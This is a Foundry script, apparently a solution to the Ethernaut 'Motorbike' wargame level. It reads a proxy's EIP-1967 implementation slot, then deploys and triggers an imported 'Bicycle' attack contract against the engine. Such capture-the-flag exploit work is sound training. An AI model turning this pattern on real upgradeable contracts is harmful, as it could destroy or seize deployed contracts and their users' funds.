// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {Bicycle} from "../src/25_Motorbike.sol";

contract PoC is Script {
    address private immutable motorbike =
        0x72DDB3C8b89C235a6368DC094066e21AbE8759Cc; // Replace with your Motorbike instance

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployer);

        address engineAddress = address(
            uint160(
                uint256(
                    vm.load(
                        motorbike,
                        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
                    )
                )
            )
        );

        console2.log("Engine address: ", engineAddress);

        Bicycle bicycle = new Bicycle(engineAddress);
        bicycle.attack();

        vm.stopBroadcast();
    }
}
